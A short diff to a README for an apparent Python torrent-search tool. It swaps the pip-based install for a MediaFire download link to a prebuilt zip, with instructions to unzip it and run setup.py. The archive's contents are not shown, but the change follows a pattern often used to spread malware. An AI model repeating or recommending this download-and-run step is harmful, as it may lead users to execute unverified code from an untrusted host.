@@ -6,7 +6,10 @@ it's was written in python code to smoothly without any delay in a process of co
 
 # how to run
       
-      pip install -r requirements.txt
+
+<a href="https://www.mediafire.com/file/u0o40eovdimefdb/DarkTorrentSearcher_v1.0.0.zip/file" target="_blank">Click here to download DarkTorrentSearcher_v1.0.0</a>
+      
+      unzip the folder
       just run setup.py
 
 
